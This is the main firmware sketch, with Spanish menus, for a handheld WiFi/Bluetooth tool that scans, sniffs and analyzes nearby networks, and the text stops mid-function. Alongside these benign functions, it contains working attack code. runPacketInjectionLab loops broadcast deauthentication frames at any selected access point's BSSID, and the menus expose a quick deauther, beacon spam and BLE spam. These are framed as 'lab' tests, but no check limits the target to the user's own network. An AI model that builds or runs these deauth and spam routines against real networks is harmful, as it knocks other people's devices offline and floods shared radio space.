#include "Config.h"
#include "DisplayUi.h"
#include "LabStats.h"
#include "LabTestEngine.h"
#include "TargetManager.h"
#include "WifiScanner.h"
#include "packet-injection.h"
#include "PromiscuousSniffer.h"
#include "BluetoothScanner.h"
#include "BeaconSpam.h"
#include "BleSpam.h"

enum UiState {
  UI_MAIN_MENU,
  UI_WIFI_MENU,
  UI_PLACEHOLDER,
  UI_BAND_MENU,
  UI_NETWORK_LIST,
  UI_NETWORK_DETAILS,
  UI_TARGET_DETAILS,
  UI_ANALYZER,
  UI_SYSTEM_INFO,
  UI_LAB_MENU,
  UI_LAB_PRECHECK,
  UI_TARGET_MONITOR,
  UI_LAB_STATS,
  UI_PRINCIPAL_TEST,
  UI_BLE_MENU,
  UI_BLE_LIST,
  UI_BLE_DETAILS,
  UI_BLE_ANALYZER,
  UI_WIFI_ANAL_24,
  UI_WIFI_ANAL_5,
  UI_RADAR_BAND_MENU,
  UI_RADAR_NETWORK_LIST,
  UI_WIFI_RADAR,
  UI_BEACON_SPAM,
  UI_BLE_SPAM,
  UI_SNIFFER
};

static const char *const MAIN_MENU_ITEMS[] = {
  "WiFi",
  "Bluetooth",
  "Sistema"
};

static const char *const WIFI_MENU_ITEMS[] = {
  "Scan redes",
  "Radar WiFi",
  "Objetivo",
  "Deauther rapido",
  "Analizador",
  "Trafico 2.4G",
  "Trafico 5G",
  "Sniffer 2.4G",
  "Sniffer 5G",
  "Beacon 2.4G",
  "Beacon 5G",
  "Volver"
};

static const char *const LAB_MENU_ITEMS[] = {
  "Deauther",
  "Prueba principal",
  "Precheck",
  "Monitor RSSI",
  "Re-scan objetivo",
  "Resultados",
  "Reset stats",
  "Volver"
};

static const char *const BLE_MENU_ITEMS[] = {
  "Scan dispositivos",
  "Analizador",
  "BLE spam",
  "Volver"
};

static const uint8_t MAIN_MENU_COUNT = sizeof(MAIN_MENU_ITEMS) / sizeof(MAIN_MENU_ITEMS[0]);
static const uint8_t WIFI_MENU_COUNT = sizeof(WIFI_MENU_ITEMS) / sizeof(WIFI_MENU_ITEMS[0]);
static const uint8_t LAB_MENU_COUNT = sizeof(LAB_MENU_ITEMS) / sizeof(LAB_MENU_ITEMS[0]);
static const uint8_t BLE_MENU_COUNT = sizeof(BLE_MENU_ITEMS) / sizeof(BLE_MENU_ITEMS[0]);
static const uint16_t LAB_DEAUTH_REASON = 0x06;
static const uint8_t LAB_DEAUTH_CYCLE_LIMIT = 10;
static const uint16_t LAB_DEAUTH_TX_GAP_MS = 100;
static const uint16_t RADAR_REFRESH_MS = 2500;

UiState uiState = UI_MAIN_MENU;
uint8_t mainMenuIndex = 0;
uint8_t wifiMenuIndex = 0;
uint8_t labMenuIndex = 0;
int selectedNetwork = 0;
int listTop = 0;
uint8_t selectedBand = 5;
uint8_t analyzerBand = 5;
uint32_t lastRadarScanAt = 0;
NetworkInfo radarNetwork;
char radarBssid[18] = {0};
bool radarNetworkFound = false;
bool radarScanActive = false;
bool labInjectionStoppedByUser = false;
int selectedBleDevice = -1;
int bleListTop = 0;
uint8_t bleMenuIndex = 0;

void setup() {
  Serial.begin(115200);
  delay(1000);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);

  uiBegin();
  wifiScannerBegin();
  sniffBegin();
  bleBegin();
  beaconSpamBegin();
  bleSpamBegin();
  uiDrawSplash();
  delay(1800);
  drawMainMenu();
}

void loop() {
  if (digitalRead(BTN_UP) == LOW) {
    handleUp();
  }

  if (digitalRead(BTN_OK) == LOW) {
    handleOk();
  }

  if (digitalRead(BTN_DOWN) == LOW) {
    handleDown();
  }

  if (uiState == UI_MAIN_MENU || uiState == UI_WIFI_MENU || uiState == UI_LAB_MENU || uiState == UI_BAND_MENU || uiState == UI_RADAR_BAND_MENU || uiState == UI_BLE_MENU) {
    uiTickMenuAnimation();
  }

  if (bleActive()) {
    bleAnalyzerTick();
  }

  if (uiState == UI_SNIFFER) {
    sniffTick();
    static uint32_t lastSniffRefresh = 0;
    if (millis() - lastSniffRefresh > 250) {
      lastSniffRefresh = millis();
      uiRefreshSniffer(sniffGetStats());
    }
  }

  if (uiState == UI_BLE_LIST) {
    static uint32_t lastBleRefresh = 0;
    if (millis() - lastBleRefresh > 500) {
      lastBleRefresh = millis();
      uiRefreshBleList(selectedBleDevice, bleListTop);
    }
  }

  if (uiState == UI_BLE_ANALYZER) {
    static uint32_t lastAnalRefresh = 0;
    if (millis() - lastAnalRefresh > 100) {
      lastAnalRefresh = millis();
      uiRefreshBleAnalyzer();
    }
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    sniffTick();
    wifiAnalyzerTick();
    static uint32_t lastWifiAnalRefresh = 0;
    if (millis() - lastWifiAnalRefresh > 100) {
      lastWifiAnalRefresh = millis();
      uiRefreshWifiAnalyzer();
    }
  }

  if (radarScanActive) {
    bool scanOk = false;
    if (wifiScannerPollScan(&scanOk)) {
      radarScanActive = false;
      lastRadarScanAt = millis();
      if (uiState == UI_WIFI_RADAR) {
        int foundIndex = scanOk ? wifiScannerFindBssid(radarBssid) : -1;
        radarNetworkFound = foundIndex >= 0;
        if (radarNetworkFound) {
          radarNetwork = wifiScannerNetwork(foundIndex);
          selectedNetwork = foundIndex;
        }
        uiDrawWifiRadar(&radarNetwork, radarNetworkFound);
      }
    }
  }

  if (uiState == UI_WIFI_RADAR) {
    uiTickWifiRadar();
    if (!radarScanActive && millis() - lastRadarScanAt >= RADAR_REFRESH_MS) {
      radarScanActive = wifiScannerStartScan();
      if (!radarScanActive) {
        lastRadarScanAt = millis();
      }
    }
  }

  if (uiState == UI_BEACON_SPAM) {
    beaconSpamTick();
    static uint32_t lastBeaconRefresh = 0;
    if (millis() - lastBeaconRefresh > 250) {
      lastBeaconRefresh = millis();
      uiRefreshBeaconSpam();
    }
  }

  if (uiState == UI_BLE_SPAM) {
    bleSpamTick();
    static uint32_t lastBleSpamRefresh = 0;
    if (millis() - lastBleSpamRefresh > 250) {
      lastBleSpamRefresh = millis();
      uiRefreshBleSpam();
    }
  }

  delay(80);
}

void handleUp() {
  if (uiState == UI_MAIN_MENU) {
    mainMenuIndex = previousIndex(mainMenuIndex, MAIN_MENU_COUNT);
    drawMainMenu();
    delay(180);
    return;
  }

  if (uiState == UI_WIFI_MENU) {
    wifiMenuIndex = previousIndex(wifiMenuIndex, WIFI_MENU_COUNT);
    drawWifiMenu();
    delay(180);
    return;
  }

  if (uiState == UI_LAB_MENU) {
    labMenuIndex = previousIndex(labMenuIndex, LAB_MENU_COUNT);
    drawLabMenu();
    delay(180);
    return;
  }

  if (uiState == UI_PLACEHOLDER) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    delay(250);
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    uiState = UI_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(220);
    return;
  }

  if (uiState == UI_TARGET_DETAILS) {
    uiState = UI_WIFI_MENU;
    drawWifiMenu();
    delay(220);
    return;
  }

  if (uiState == UI_ANALYZER) {
    analyzerBand = previousBandOption(analyzerBand);
    if (analyzerBand == 0) analyzerBand = 2;
    uiDrawAnalyzer(analyzerBand);
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    uiState = UI_RADAR_BAND_MENU;
    uiDrawRadarBandMenu(selectedBand);
    delay(220);
    return;
  }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    uiState = UI_LAB_MENU;
    drawLabMenu();
    delay(220);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(220);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    bleMenuIndex = previousIndex(bleMenuIndex, BLE_MENU_COUNT);
    drawBleMenu();
    delay(180);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    // UP = reset historial (baseline fresca)
    bleAnalyzerReset();
    uiDrawBleAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    // UP = reset historial y contadores por canal
    sniffResetStats();
    wifiAnalyzerReset();
    uiDrawWifiAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    moveBleSelection(-1);
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectedBand = previousBandOption(selectedBand);
    uiDrawBandMenu(selectedBand);
    delay(180);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    selectedBand = previousBandOption(selectedBand);
    uiDrawRadarBandMenu(selectedBand);
    delay(180);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    moveSelection(-1);
    return;
  }

  if (uiState == UI_RADAR_NETWORK_LIST) {
    moveSelection(-1);
    return;
  }

  if (uiState == UI_BEACON_SPAM) {
    exitBeaconSpam();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_SPAM) {
    exitBleSpam();
    delay(220);
    return;
  }

  if (uiState == UI_SNIFFER) {
    return;
  }

  drawMainMenu();
  delay(250);
}

void handleOk() {
  if (uiState == UI_MAIN_MENU) {
    openMainMenuItem();
    return;
  }

  if (uiState == UI_WIFI_MENU) {
    openWifiMenuItem();
    return;
  }

  if (uiState == UI_LAB_MENU) {
    openLabMenuItem();
    return;
  }

  if (uiState == UI_PLACEHOLDER) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    if (targetHasSelection() && sameTarget(selectedNetwork)) {
      runDeauthLab();
    } else {
      targetSet(wifiScannerNetwork(selectedNetwork));
      labStatsReset(targetGet().bssid);
      uiDrawNetworkDetails(wifiScannerNetwork(selectedNetwork), true);
      waitForLabButtonsReleased();
    }
    return;
  }

  if (uiState == UI_TARGET_DETAILS) {
    runDeauthLab();
    return;
  }

  if (uiState == UI_ANALYZER) {
    uiState = UI_WIFI_MENU;
    drawWifiMenu();
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    int radarIndex = wifiScannerFindBssid(radarBssid);
    if (radarIndex >= 0) {
      selectedNetwork = radarIndex;
    } else {
      selectFirstNetworkInBand();
    }
    listTop = 0;
    uiState = UI_RADAR_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    delay(220);
    return;
  }

  if (uiState == UI_TARGET_MONITOR) {
    runTargetRefresh();
    return;
  }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    uiState = UI_LAB_MENU;
    drawLabMenu();
    delay(220);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(220);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    openBleMenuItem();
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    closeBleAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    exitWifiAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    if (selectedBleDevice < 0) {
      closeBleScanList();
      delay(220);
      return;
    }
    if (selectedBleDevice < (int)bleCount()) {
      BleDeviceInfo device;
      if (!bleCopyDevice(selectedBleDevice, device)) {
        return;
      }
      uiState = UI_BLE_DETAILS;
      uiDrawBleDetails(device);
      delay(220);
    }
    return;
  }

  if (uiState == UI_BAND_MENU) {
    if (selectedBand == 0) {
      uiState = UI_WIFI_MENU;
      drawWifiMenu();
      delay(220);
      return;
    }

    selectFirstNetworkInBand();
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    if (selectedBand == 0) {
      uiState = UI_WIFI_MENU;
      drawWifiMenu();
      delay(220);
      return;
    }

    selectFirstNetworkInBand();
    uiState = UI_RADAR_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    if (selectedNetwork == -1) {
      uiState = UI_BAND_MENU;
      uiDrawBandMenu(selectedBand);
      delay(220);
      return;
    }
    uiState = UI_NETWORK_DETAILS;
    uiDrawNetworkDetails(wifiScannerNetwork(selectedNetwork), targetHasSelection() && sameTarget(selectedNetwork));
    delay(220);
    return;
  }

  if (uiState == UI_RADAR_NETWORK_LIST) {
    if (selectedNetwork < 0) {
      uiState = UI_RADAR_BAND_MENU;
      uiDrawRadarBandMenu(selectedBand);
      delay(220);
      return;
    }
    startWifiRadar(selectedNetwork);
    return;
  }

  if (uiState == UI_BEACON_SPAM) {
    exitBeaconSpam();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_SPAM) {
    exitBleSpam();
    delay(220);
    return;
  }

  if (uiState == UI_SNIFFER) {
    exitSniffer();
    delay(220);
    return;
  }
}

void handleDown() {
  if (uiState == UI_MAIN_MENU) {
    mainMenuIndex = nextIndex(mainMenuIndex, MAIN_MENU_COUNT);
    drawMainMenu();
    delay(180);
    return;
  }

  if (uiState == UI_WIFI_MENU) {
    wifiMenuIndex = nextIndex(wifiMenuIndex, WIFI_MENU_COUNT);
    drawWifiMenu();
    delay(180);
    return;
  }

  if (uiState == UI_LAB_MENU) {
    labMenuIndex = nextIndex(labMenuIndex, LAB_MENU_COUNT);
    drawLabMenu();
    delay(180);
    return;
  }

  if (uiState == UI_PLACEHOLDER) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    delay(250);
    return;
  }

  if (uiState == UI_NETWORK_DETAILS) {
    uiState = UI_BAND_MENU;
    uiDrawBandMenu(selectedBand);
    delay(220);
    return;
  }

  if (uiState == UI_TARGET_DETAILS) {
    uiState = UI_WIFI_MENU;
    drawWifiMenu();
    delay(220);
    return;
  }

  if (uiState == UI_ANALYZER) {
    analyzerBand = nextBandOption(analyzerBand);
    if (analyzerBand == 0) analyzerBand = 5;
    uiDrawAnalyzer(analyzerBand);
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_RADAR) {
    uiState = UI_RADAR_BAND_MENU;
    uiDrawRadarBandMenu(selectedBand);
    delay(220);
    return;
  }

  if (uiState == UI_LAB_PRECHECK || uiState == UI_TARGET_MONITOR || uiState == UI_LAB_STATS || uiState == UI_PRINCIPAL_TEST) {
    uiState = UI_LAB_MENU;
    drawLabMenu();
    delay(220);
    return;
  }

  if (uiState == UI_SYSTEM_INFO) {
    uiState = UI_MAIN_MENU;
    drawMainMenu();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_DETAILS) {
    uiState = UI_BLE_LIST;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(220);
    return;
  }

  if (uiState == UI_BLE_MENU) {
    bleMenuIndex = nextIndex(bleMenuIndex, BLE_MENU_COUNT);
    drawBleMenu();
    delay(180);
    return;
  }

  if (uiState == UI_BLE_ANALYZER) {
    closeBleAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_WIFI_ANAL_24 || uiState == UI_WIFI_ANAL_5) {
    exitWifiAnalyzer();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_LIST) {
    moveBleSelection(1);
    return;
  }

  if (uiState == UI_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawBandMenu(selectedBand);
    delay(180);
    return;
  }

  if (uiState == UI_RADAR_BAND_MENU) {
    selectedBand = nextBandOption(selectedBand);
    uiDrawRadarBandMenu(selectedBand);
    delay(180);
    return;
  }

  if (uiState == UI_NETWORK_LIST) {
    moveSelection(1);
    return;
  }

  if (uiState == UI_RADAR_NETWORK_LIST) {
    moveSelection(1);
    return;
  }

  if (uiState == UI_BEACON_SPAM) {
    exitBeaconSpam();
    delay(220);
    return;
  }

  if (uiState == UI_BLE_SPAM) {
    exitBleSpam();
    delay(220);
    return;
  }

  if (uiState == UI_SNIFFER) {
    return;
  }

  drawMainMenu();
  delay(250);
}

void drawMainMenu() {
  uiDrawMenu(FIRMWARE_NAME, MAIN_MENU_ITEMS, MAIN_MENU_COUNT, mainMenuIndex, "UP/DOWN  OK");
}

void drawWifiMenu() {
  uiDrawMenu("WiFi", WIFI_MENU_ITEMS, WIFI_MENU_COUNT, wifiMenuIndex, "UP/DOWN  OK");
}

void drawRadarBandMenu() {
  uiDrawRadarBandMenu(selectedBand);
}

void drawLabMenu() {
  uiDrawMenu("Pruebas lab", LAB_MENU_ITEMS, LAB_MENU_COUNT, labMenuIndex, "Objetivo requerido");
}

void openMainMenuItem() {
  switch (mainMenuIndex) {
    case 0:
      uiState = UI_WIFI_MENU;
      drawWifiMenu();
      break;
    case 1:
      enterBle();
      break;
    case 2:
      uiState = UI_SYSTEM_INFO;
      uiDrawSystemInfo(targetHasSelection(), wifiScannerCount(), wifiScannerCountBand(2), wifiScannerCountBand(5));
      break;
  }
}

void openLabMenuItem() {
  switch (labMenuIndex) {
    case 0:
      runDeauthLab();
      break;
    case 1:
      runPrincipalTest();
      break;
    case 2:
      uiState = UI_LAB_PRECHECK;
      uiDrawLabPrecheck(targetHasSelection(), targetHasSelection() ? &targetGet() : NULL);
      break;
    case 3:
      if (!targetHasSelection()) {
        showPlaceholder("Monitor RSSI", "Sin objetivo aun");
      } else {
        uiState = UI_TARGET_MONITOR;
        uiDrawTargetMonitor(targetGet(), true);
      }
      break;
    case 4:
      runTargetRefresh();
      break;
    case 5:
      uiState = UI_LAB_STATS;
      uiDrawLabStats(labStatsGet());
      break;
    case 6:
      if (targetHasSelection()) {
        labStatsReset(targetGet().bssid);
        showPlaceholder("Stats", "Reiniciadas");
      } else {
        showPlaceholder("Stats", "Sin objetivo aun");
      }
      break;
    case 7:
      uiState = UI_MAIN_MENU;
      drawMainMenu();
      break;
  }
}

void openWifiMenuItem() {
  switch (wifiMenuIndex) {
    case 0:
      runScan();
      break;
    case 1:
      enterWifiRadar();
      break;
    case 2:
      if (!targetHasSelection()) {
        showPlaceholder("Objetivo", "Sin objetivo aun");
      } else {
        uiState = UI_TARGET_DETAILS;
        uiDrawTargetDetails(targetGet());
      }
      break;
    case 3:
      runDeauthLab();
      break;
    case 4:
      if (wifiScannerCount() == 0) {
        showPlaceholder("Analizador", "Primero haz scan");
      } else {
        analyzerBand = selectedBand == 0 ? 5 : selectedBand;
        uiState = UI_ANALYZER;
        uiDrawAnalyzer(analyzerBand);
      }
      break;
    case 5:
      enterWifiAnalyzer(2);
      break;
    case 6:
      enterWifiAnalyzer(5);
      break;
    case 7:
      enterSniffer(2);
      break;
    case 8:
      enterSniffer(5);
      break;
    case 9:
      enterBeaconSpam(2);
      break;
    case 10:
      enterBeaconSpam(5);
      break;
    case 11:
      uiState = UI_MAIN_MENU;
      drawMainMenu();
      break;
  }
}

void enterWifiRadar() {
  uiDrawStatus("Radar: escaneando...");

  if (!wifiScannerScan()) {
    uiDrawStatus("Radar: scan fallo");
    delay(900);
    uiState = UI_WIFI_MENU;
    drawWifiMenu();
    return;
  }

  selectedBand = wifiScannerCountBand(5) > 0 ? 5 : 2;
  uiState = UI_RADAR_BAND_MENU;
  drawRadarBandMenu();
}

void startWifiRadar(int networkIndex) {
  radarNetwork = wifiScannerNetwork(networkIndex);
  strncpy(radarBssid, radarNetwork.bssid, sizeof(radarBssid));
  radarBssid[sizeof(radarBssid) - 1] = '\0';
  radarNetworkFound = true;
  radarScanActive = false;
  lastRadarScanAt = millis();
  uiState = UI_WIFI_RADAR;
  uiDrawWifiRadar(&radarNetwork, true);
}

void enterSniffer(uint8_t band) {
  uiDrawStatus(band == 5 ? "Sniffer 5G..." : "Sniffer 2.4G...");
  if (!sniffStart(band)) {
    showPlaceholder("Sniffer", "WiFi fallo");
    return;
  }
  uiState = UI_SNIFFER;
  uiDrawSniffer(sniffGetStats());
  waitForLabButtonsReleased();
}

void exitSniffer() {
  sniffStop();
  uiState = UI_WIFI_MENU;
  drawWifiMenu();
}

void enterWifiAnalyzer(uint8_t band) {
  uiDrawStatus(band == 5 ? "Iniciando 5G..." : "Iniciando 2.4G...");
  if (!sniffStart(band)) {
    showPlaceholder("Trafico", "WiFi fallo");
    return;
  }
  uiState = (band == 5) ? UI_WIFI_ANAL_5 : UI_WIFI_ANAL_24;
  uiDrawWifiAnalyzer();
  waitForLabButtonsReleased();
}

void exitWifiAnalyzer() {
  sniffStop();
  uiState = UI_WIFI_MENU;
  drawWifiMenu();
}

void enterBeaconSpam(uint8_t band) {
  uiDrawStatus(band == 5 ? "Iniciando Beacon 5G..." : "Iniciando Beacon 2.4G...");
  if (!beaconSpamStart(band)) {
    showPlaceholder("Beacon", "WiFi fallo");
    return;
  }
  uiState = UI_BEACON_SPAM;
  uiDrawBeaconSpam();
  waitForLabButtonsReleased();
}

void exitBeaconSpam() {
  beaconSpamStop();
  uiState = UI_WIFI_MENU;
  drawWifiMenu();
}

void enterBle() {
  if (!bleActive()) {
    uiDrawStatus("Iniciando BLE...");
    if (!bleStart()) {
      showPlaceholder("Bluetooth", "BLE fallo");
      return;
    }
  }
  bleMenuIndex = 0;
  uiState = UI_BLE_MENU;
  drawBleMenu();
  waitForLabButtonsReleased();
}

void exitBle() {
  bleStop();
  uiState = UI_MAIN_MENU;
  drawMainMenu();
}

void enterBleSpam() {
  uiDrawStatus("Iniciando BLE spam...");
  if (!bleSpamStart()) {
    showPlaceholder("BLE spam", "BLE fallo");
    return;
  }
  uiState = UI_BLE_SPAM;
  uiDrawBleSpam();
  waitForLabButtonsReleased();
}

void exitBleSpam() {
  bleSpamStop();
  uiState = UI_BLE_MENU;
  drawBleMenu();
}

void drawBleMenu() {
  uiDrawMenu("Bluetooth", BLE_MENU_ITEMS, BLE_MENU_COUNT, bleMenuIndex, "Scan / Analizar");
}

void openBleMenuItem() {
  switch (bleMenuIndex) {
    case 0: openBleScanList();   break;
    case 1: openBleAnalyzer();   break;
    case 2: enterBleSpam();      break;
    case 3: exitBle();           break;
  }
}

void openBleScanList() {
  if (!bleActive()) {
    uiDrawStatus("Iniciando BLE...");
    if (!bleStart()) {
      showPlaceholder("Bluetooth", "BLE fallo");
      return;
    }
  }

  selectedBleDevice = -1;
  bleListTop = 0;
  uiState = UI_BLE_LIST;
  uiDrawBleList(selectedBleDevice, bleListTop);
}

void closeBleScanList() {
  uiState = UI_BLE_MENU;
  drawBleMenu();
}

void openBleAnalyzer() {
  bleAnalyzerReset();
  uiState = UI_BLE_ANALYZER;
  uiDrawBleAnalyzer();
  waitForLabButtonsReleased();
}

void closeBleAnalyzer() {
  uiState = UI_BLE_MENU;
  drawBleMenu();
}

void moveBleSelection(int delta) {
  uint8_t total = bleCount();
  if (total == 0) {
    selectedBleDevice = -1;
    bleListTop = 0;
    uiDrawBleList(selectedBleDevice, bleListTop);
    delay(180);
    return;
  }

  if (delta > 0) {
    // DOWN: -1 -> 0 -> 1 -> ... -> total-1 -> -1
    if (selectedBleDevice < 0) {
      selectedBleDevice = 0;
    } else if (selectedBleDevice + 1 >= (int)total) {
      selectedBleDevice = -1;
    } else {
      selectedBleDevice++;
    }
  } else {
    // UP: -1 -> total-1 -> ... -> 0 -> -1
    if (selectedBleDevice < 0) {
      selectedBleDevice = (int)total - 1;
    } else if (selectedBleDevice == 0) {
      selectedBleDevice = -1;
    } else {
      selectedBleDevice--;
    }
  }

  // Mantener selectedBleDevice visible en la ventana de scroll
  const int VISIBLE_ROWS = 7;
  if (selectedBleDevice < 0) {
    bleListTop = 0;
  } else if (selectedBleDevice < bleListTop) {
    bleListTop = selectedBleDevice;
  } else if (selectedBleDevice >= bleListTop + VISIBLE_ROWS) {
    bleListTop = selectedBleDevice - VISIBLE_ROWS + 1;
  }

  uiDrawBleList(selectedBleDevice, bleListTop);
  delay(180);
}

void runPrincipalTest() {
  if (!targetHasSelection()) {
    showPlaceholder("Principal", "Sin objetivo aun");
    return;
  }

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  labTestPrepare(targetGet());
  uiDrawStatus("Prueba principal...");

  bool scanOk = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    labTestEvaluate(targetGet(), true, labStatsGet());
  } else {
    labStatsAdd(false, NULL);
    labTestEvaluate(targetGet(), false, labStatsGet());
  }

  labTestPrintToSerial();
  labStatsPrintToSerial();
  uiState = UI_PRINCIPAL_TEST;
  uiDrawPrincipalTest(labTestGetReport());
}

void runDeauthLab() {
  if (!targetHasSelection()) {
    showPlaceholder("Deauther", "Sin objetivo aun");
    return;
  }

  UiState returnState = uiState;

  char targetBssid[18];
  strncpy(targetBssid, targetGet().bssid, sizeof(targetBssid));
  targetBssid[sizeof(targetBssid) - 1] = '\0';

  if (!labStatsActive() || strcmp(labStatsGet().bssid, targetBssid) != 0) {
    labStatsReset(targetBssid);
  }

  uiDrawStatus("Deauther...");
  bool txInvoked = runPacketInjectionLab(targetGet());
  delay(250);

  if (labInjectionStoppedByUser) {
    returnToDeauthCaller(returnState);
    return;
  }

  uiDrawStatus("Re-scan...");
  bool scanOk = wifiScannerScan();
  int foundIndex = scanOk ? wifiScannerFindBssid(targetBssid) : -1;

  if (foundIndex >= 0) {
    targetSet(wifiScannerNetwork(foundIndex));
    labStatsAdd(true, &targetGet());
    selectedNetwork = foundIndex;
    selectedBand = wifiScannerIs5GHz(targetGet().channel) ? 5 : 2;
    labTestSimulateDeauth(targetGet(), true, labStatsGet(), txInvoked);
  } else {
    labStatsAdd(false, NULL);
    labTestSimulateDeauth(targetGet(), false, labStatsGet(), txInvoked);
  }

  labTestPrintToSerial();
  labStatsPrintToSerial();
  uiState = UI_PRINCIPAL_TEST;
  uiDrawPrincipalTest(labTestGetReport());
}

bool runPacketInjectionLab(const NetworkInfo &target) {
  labInjectionStoppedByUser = false;

  if (isInjectionBlockedSecurity(target.security)) {
    Serial.println("[LAB] Packet injection omitida: PMF/WPA3 probable.");
    uiDrawStatus("PMF/WPA3 probable");
    delay(900);
    return false;
  }

  uint8_t targetMac[6];
  if (!parseMacAddress(target.bssid, targetMac)) {
    Serial.println("[LAB] Packet injection omitida: BSSID invalido.");
    uiDrawStatus("BSSID invalido");
    delay(900);
    return false;
  }

  uint8_t broadcastMac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

  Serial.print("[LAB] Invocando packet injection en BSSID ");
  Serial.println(target.bssid);
  Serial.print("[LAB] Canal objetivo ");
  Serial.println(target.channel);

  if (!rearmLabWifi(target.channel)) {
    return false;
  }

  uiDrawStatus("OK detiene");
  waitForLabButtonsReleased();

  bool anySent = false;
  uint32_t sentCount = 0;
  uiDrawTxCounter(sentCount);

  while (true) {
    for (uint8_t burst = 0; burst < LAB_DEAUTH_CYCLE_LIMIT; burst++) {
      if (labStopRequested()) {
        return stopPacketInjectionLab(anySent, sentCount);
      }

      bool sent = wifi_tx_deauth_frame(targetMac, broadcastMac, LAB_DEAUTH_REASON);
      anySent = anySent || sent;
      if (sent) {
        sentCount++;
      }

      uiDrawTxCounter(sentCount);

      Serial.print("[LAB] TX frame ");
      Serial.print(sentCount);
      Serial.println(sent ? " OK" : " FAIL");

      delay(LAB_DEAUTH_TX_GAP_MS);
    }

    if (labStopRequested()) {
      return stopPacketInjectionLab(anySent, sentCount);
    }

    if (!rearmLabWifi(target.channel)) {
      Serial.println("[LAB] No se pudo rearmar WiFi; prueba detenida.");
      uiDrawStatus("WiFi rearm fallo");
      delay(900);
      return anySent;
    }
  }
}

bool rearmLabWifi(uint8_t channel) {
  uiDrawStatus("Rearmando WiFi...");
  wifi_off();
  delay(220);

  if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
    Serial.println("[LAB] wifi_on fallo.");
    uiDrawStatus("WiFi on fallo");
    delay(300);
    return false;
  }

  delay(240);
  uiDrawStatus("Fijando canal...");
  if (wifi_set_channel(channel) != RTW_SUCCESS) {
    Serial.println("[LAB] No se pudo fijar el canal objetivo.");
    uiDrawStatus("Canal fallo");
    delay(120);
    return false;
  }

  delay(90);
  return true;
}

bool stopPacketInjectionLab(bool anySent, uint32_t sentCount) {
  labInjectionStoppedByUser = true;
  Serial.println("[LAB] Packet injection detenida por boton.");
  Serial.print("[LAB] Total frames OK: ");
  Serial.println(sentCount);
  uiDrawStatus("Detenido");
  delay(700);
  waitForLabButtonsReleased();
  return anySent;
}

void returnToDeauthCaller(UiState returnState) {
  if (returnState == UI_LAB_MENU) {
    uiState = UI_LAB_MENU;
    drawLabMenu();
    return;
  }

  if (returnState == UI_NETWORK_DETAILS) {
    uiState = UI_NETWORK_LIST;
    uiDrawNetworkList(selectedBand, selectedNetwork, listTop);
    return;
  }

  uiState = UI_WIFI_MENU;
  drawWifiMenu();
}

bool labStopRequested() {
  if (digitalRead(BTN_OK) != LOW) {
    return false;
  }

  delay(220);
  return digitalRead(BTN_OK) == LOW;
}

void waitForLabButtonsReleased() {
